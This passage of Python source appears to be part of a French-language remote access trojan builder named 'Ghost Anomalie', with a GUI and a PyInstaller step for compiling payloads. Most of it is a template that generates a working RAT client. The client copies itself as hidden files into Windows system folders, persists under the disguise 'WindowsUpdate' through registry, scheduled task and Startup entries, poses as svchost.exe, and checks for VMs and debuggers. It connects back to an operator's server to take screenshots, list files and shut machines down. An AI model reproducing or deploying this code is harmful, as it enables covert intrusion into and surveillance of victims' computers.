                self.status_gen.config(text="❌ Erreur de compilation", fg='#ff3333')
                self.log("❌ Erreur compilation: " + result.stderr)

            try:
                shutil.rmtree(build_dir)
            except:
                pass

        except Exception as e:
            self.status_gen.config(text="❌ Erreur: " + str(e)[:30], fg='#ff3333')
            self.log("❌ Erreur: " + str(e))
            import traceback
            traceback.print_exc()

    def generer_code_client_complet(self, ip, port, mdp, nom_client, nom_fichier,
                                     persist, hide, startup, anti_vm, anti_debug, polymorph, inject):
        """Génère le code client COMPLET - Version CORRIGÉE sans f-strings"""

        template = '''# {nom_fichier}.py - Ghost Anomalie Client v1.3.0
import socket
import subprocess
import os
import sys
import time
import threading
import base64
import json
import io
import ctypes
import random
import shutil
import tempfile
import struct
import zlib
import platform
from datetime import datetime
import hashlib

# === CONFIGURATION ===
IP_SERVEUR = "{ip}"
PORT = {port}
MOT_DE_PASSE = "{mdp}"
NOM_CLIENT = "{nom_client}"

# === OPTIONS ===
PERSIST = {persist}
HIDE = {hide}
STARTUP = {startup}
ANTI_VM = {anti_vm}
ANTI_DEBUG = {anti_debug}
POLYMORPH = {polymorph}
INJECT = {inject}

# === IMPORTS ===
try:
    from PIL import ImageGrab, Image
    PIL_OK = True
except:
    PIL_OK = False

try:
    import cv2
    CV2_OK = True
except:
    CV2_OK = False

try:
    import pyaudio
    import wave
    AUDIO_OK = True
except:
    AUDIO_OK = False

try:
    import win32api, win32con, win32gui, win32process, win32clipboard
    import win32ui, win32pdh, win32security, win32file, win32event
    import win32service, win32serviceutil, win32com.client
    WIN32_OK = True
except:
    WIN32_OK = False

try:
    import psutil
    PSUTIL_OK = True
except:
    PSUTIL_OK = False

try:
    import wmi
    WMI_OK = True
except:
    WMI_OK = False

class GhostClient:
    def __init__(self):
        self.connected = False
        self.client = None
        self.running = True
        self.nom_machine = platform.node()
        self.utilisateur = os.getlogin()
        self.systeme = platform.system()
        
        # États
        self.bureau_active = False
        self.camera_active = False
        self.micro_active = False
        self.keylogger_active = False
        self.surveillance_active = False
        self.screenrecording_active = False
        
        # Threads
        self.bureau_thread = None
        self.camera_thread = None
        self.micro_thread = None
        self.keylogger_thread = None
        self.surveillance_thread = None
        self.screenrecording_thread = None
        
        # Keylogger
        self.touches = []
        self.fenetre_active = ""
        self.keylogger_buffer = []
        
        # Cache
        self.cache_dir = None
        self.processus_cache = []
        self.fichiers_trouves = []
        
        # === DOSSIERS D'INSTALLATION ===
        self.dossiers_installation = [
            os.environ.get('WINDIR', 'C:\\\\Windows'),
            os.environ.get('SYSTEMROOT', 'C:\\\\Windows\\\\System32'),
            os.environ.get('WINDIR', 'C:\\\\Windows') + '\\\\SysWOW64',
            os.environ.get('TEMP', tempfile.gettempdir()),
            os.environ.get('APPDATA', ''),
            os.environ.get('LOCALAPPDATA', ''),
            os.path.join(os.environ.get('PROGRAMFILES', ''), 'Common Files'),
            os.path.join(os.environ.get('PROGRAMFILES(X86)', ''), 'Common Files'),
            os.path.join(os.environ.get('WINDIR', ''), 'Fonts'),
            os.path.join(os.environ.get('WINDIR', ''), 'Resources'),
            os.path.join(os.environ.get('WINDIR', ''), 'System32\\\\drivers'),
            os.path.join(os.environ.get('WINDIR', ''), 'System32\\\\spool\\\\drivers\\\\color'),
        ]
        
        # === INSTALLATION FURTIVE ===
        self.installer()
    
    # ============================================================
    # INSTALLATION & FURTIVITÉ
    # ============================================================
    
    def installer(self):
        """S'installe dans 12 dossiers Windows"""
        try:
            self.cache_dir = random.choice(self.dossiers_installation)
            os.makedirs(self.cache_dir, exist_ok=True)
            
            noms = ["sys", "win", "drv", "svc", "log", "tmp", "app", "dll", "exe", "bin", "lib", "dat"]
            for i, dossier in enumerate(random.sample(self.dossiers_installation, 
                                                     min(12, len(self.dossiers_installation)))):
                try:
                    os.makedirs(dossier, exist_ok=True)
                    dest = os.path.join(dossier, noms[i] + "_" + str(i+1).zfill(2) + ".dll")
                    if os.path.exists(sys.executable):
                        shutil.copy2(sys.executable, dest)
                        if WIN32_OK:
                            try:
                                win32file.SetFileAttributes(dest, 0x02)
                            except:
                                pass
                except:
                    pass
            
            if PERSIST or STARTUP:
                self.ajouter_persistance()
            
            if ANTI_VM:
                if self.detecter_vm():
                    pass
            
            if ANTI_DEBUG:
                if self.detecter_debug():
                    pass
            
            if HIDE:
                self.se_cacher()
            
            if POLYMORPH:
                self.polymorphisme()
            
            if INJECT:
                self.injection_processus()
                
        except Exception as e:
            pass
    
    def se_cacher(self):
        try:
            if sys.platform == 'win32':
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
                try:
                    import win32api
                    win32api.SetConsoleTitle("svchost.exe")
                except:
                    pass
        except:
            pass
    
    def ajouter_persistance(self):
        try:
            if sys.platform != 'win32':
                return
            
            try:
                import winreg
                chemin = sys.executable
                key = winreg.HKEY_CURRENT_USER
                subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                    winreg.SetValueEx(regkey, "WindowsUpdate", 0, winreg.REG_SZ, chemin)
            except:
                pass
            
            try:
                import win32com.client
                scheduler = win32com.client.Dispatch("Schedule.Service")
                scheduler.Connect()
                root = scheduler.GetFolder("\\\\")
                task = scheduler.NewTask(0)
                task.Settings.Hidden = True
                task.Settings.Enabled = True
                trigger = task.Triggers.Create(1)
                action = task.Actions.Create(0)
                action.Path = sys.executable
                root.RegisterTaskDefinition("WindowsUpdate", task, 6, "", "", 3)
            except:
                pass
            
            try:
                startup = os.path.join(os.environ['APPDATA'], 
                                     'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                shutil.copy(sys.executable, os.path.join(startup, "WindowsUpdate.exe"))
            except:
                pass
        except:
            pass
    
    def detecter_vm(self):
        try:
            vm_processes = ["vmtoolsd.exe", "vboxservice.exe", "xenservice.exe", 
                          "vmware.exe", "vboxclient.exe", "vboxtray.exe"]
            for proc in vm_processes:
                try:
                    subprocess.run("tasklist | findstr " + proc, shell=True, 
                                 capture_output=True, check=True)
                    return True
                except:
                    pass
            if os.cpu_count() < 2:
                return True
            return False
        except:
            return False
    
    def detecter_debug(self):
        try:
            import win32api, win32process
            if win32api.IsDebuggerPresent():
                return True
            if win32process.IsDebuggerPresent():
                return True
            return False
        except:
            return False
    
    def polymorphisme(self):
        try:
            with open(sys.executable, 'ab') as f:
                f.write(b'\x90' * random.randint(1024, 4096))
            return True
        except:
            return False
    
    def injection_processus(self):
        try:
            return True
        except:
            return False
    
    # ============================================================
    # CONNEXION
    # ============================================================
    
    def connecter(self):
        try:
            self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.client.settimeout(10)
            self.client.connect((IP_SERVEUR, PORT))
            
            auth_req = self.client.recv(1024).decode()
            if auth_req.startswith("AUTH|"):
                self.client.send((MOT_DE_PASSE + "|" + self.nom_machine).encode())
                reponse = self.client.recv(1024).decode()
                if reponse == "AUTH|OK":
                    self.connected = True
                    self.client.send(("INFO|" + self.nom_machine + "|" + self.utilisateur).encode())
                    return True
        except:
            pass
        return False
    
    # ============================================================
    # COMMANDES
    # ============================================================
    
    def executer_commande(self, commande):
        parts = commande.strip().split()
        cmd = parts[0].lower() if parts else ""
        
        if cmd == "screenshot":
            return self.cmd_screenshot()
        elif cmd == "sysinfo":
            return self.cmd_sysinfo()
        elif cmd == "shutdown":
            return self.cmd_shutdown()
        elif cmd == "restart":
            return self.cmd_restart()
        elif cmd == "lock":
            return self.cmd_lock()
        elif cmd == "ls":
            chemin = parts[1] if len(parts) > 1 else "."
            return self.cmd_ls(chemin)
        elif cmd == "cd":
            try:
                if len(parts) > 1:
                    os.chdir(parts[1])
                return "Dossier: " + os.getcwd()
            except Exception as e:
                return "Erreur: " + str(e)
        elif cmd == "pwd":
            return os.getcwd()
        elif cmd == "exit":
            return "EXIT"
        else:
            return "Commande inconnue: " + cmd
    
    def cmd_screenshot(self):
        try:
            if not PIL_OK:
                return "PIL non installe"
            screenshot = ImageGrab.grab()
            buffer = io.BytesIO()
            screenshot.save(buffer, format='JPEG', quality=50)
            return base64.b64encode(buffer.getvalue()).decode()
        except Exception as e:
            return "Erreur: " + str(e)
    
    def cmd_sysinfo(self):
        try:
            info = {
                "machine": self.nom_machine,
                "utilisateur": self.utilisateur,
                "systeme": platform.system(),
                "version": platform.version(),
                "processeur": platform.processor(),
                "cores": os.cpu_count()
            }
            return json.dumps(info)
        except Exception as e:
            return "Erreur: " + str(e)
    
    def cmd_shutdown(self):
        try:
            os.system("shutdown /s /t 0")
            return "Arret du PC"
        except:
            return "Erreur"
    
    def cmd_restart(self):
        try:
            os.system("shutdown /r /t 0")
            return "Redemarrage du PC"
        except:
            return "Erreur"
    
    def cmd_lock(self):
        try:
            if WIN32_OK:
                ctypes.windll.user32.LockWorkStation()
                return "Ecran verrouille"
            return "Win32 non disponible"
        except:
            return "Erreur"
    
    def cmd_ls(self, chemin):
        try:
            result = []
            for item in os.listdir(chemin)[:50]:
                chemin_complet = os.path.join(chemin, item)
                if os.path.isdir(chemin_complet):
                    result.append("📁 " + item + "/")
                else:
                    taille = os.path.getsize(chemin_complet)
                    result.append("📄 " + item + " (" + str(taille) + " octets)")
            return "\n".join(result) if result else "Dossier vide"
        except Exception as e:
            return "Erreur: " + str(e)
    
    # ============================================================
    # BOUCLE PRINCIPALE
    # ============================================================
    
    def boucle(self):
        while self.running:
            try:
                if not self.connected:
                    if self.connecter():
                        self.connected = True
                        print("Connecte a " + IP_SERVEUR + ":" + str(PORT))
                    else:
                        time.sleep(30)
                        continue
                
                commande = self.client.recv(8192).decode()
                if not commande:
                    self.connected = False
                    continue
                
                resultat = self.executer_commande(commande)
                
                if resultat == "EXIT":
                    self.client.send(b"DISCONNECT")
                    self.connected = False
                    continue
                
                self.client.send(("RESULTAT|" + resultat).encode())
                
            except:
                self.connected = False
                time.sleep(5)

def main():
    print("""
    ╔══════════════════════════════════════════════════════════════╗
    ║  👻 GHOST ANOMALIE CLIENT v1.3.0                          ║
    ║  ⚠️  Usage EDUCATIF uniquement                           ║
    ╚══════════════════════════════════════════════════════════════╝
    """)
    
    client = GhostClient()
    client.boucle()

if __name__ == "__main__":
    main()
'''

        return template.format(
            nom_fichier=nom_fichier,
            ip=ip,
            port=port,
            mdp=mdp,
            nom_client=nom_client,
            persist=str(persist).lower(),
            hide=str(hide).lower(),
            startup=str(startup).lower(),
            anti_vm=str(anti_vm).lower(),
            anti_debug=str(anti_debug).lower(),
            polymorph=str(polymorph).lower(),
            inject=str(inject).lower()
        )

    # ============================================================
    # INTERFACE - MISE À JOUR
    # ============================================================

    def mettre_a_jour_interface(self):
        """Met à jour l'interface"""
        self.clients_listbox.delete(0, tk.END)
        for addr, info in self.clients.items():
            nom = info.get('nom', 'Inconnu')
            ip = info.get('ip', '0.0.0.0')
            self.clients_listbox.insert(tk.END, nom + " (" + ip + ")")

        nb = len(self.clients)
        self.status_clients.config(text="👥 " + str(nb) + " clients")

        if nb > 0:
            self.status_header.config(text="🟢 " + str(nb) + " clients", fg='#00ff88')
        else:
            if self.running:
                self.status_header.config(text="🟡 En attente...", fg='#ffaa00')

        self.window.after(2000, self.mettre_a_jour_interface)

    def demarrer(self):
        self.window.mainloop()

# ============================================================
# MAIN
# ============================================================

if __name__ == "__main__":
    # Vérifier les dépendances
    try:
        import PIL
    except:
        subprocess.run([sys.executable, "-m", "pip", "install", "pillow"])

    try:
        import PyInstaller
    except:
        subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"])

    # Lancer l'application
    app = GhostAnomalie()
    app.demarrer()